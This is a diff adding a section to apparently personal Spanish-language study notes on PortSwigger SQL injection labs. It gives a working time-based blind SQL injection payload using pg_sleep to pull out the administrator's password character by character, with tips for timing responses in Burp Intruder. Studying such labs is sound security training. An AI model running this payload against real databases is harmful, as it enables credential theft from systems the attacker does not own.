@@ -187,5 +187,10 @@ Si la página nos muestra una query, nosotros podemos subvertir el valor de la m
 https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based#
 
 
+#################### Blind time-based sqli:
+
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+COn el intruder de burp, podemos agregar dentro del menu columns la columna "response reseived". Las columnas con mayor tiempo (por amplia diferencia) son aquellas cuyo char sea verdadero.
 
 
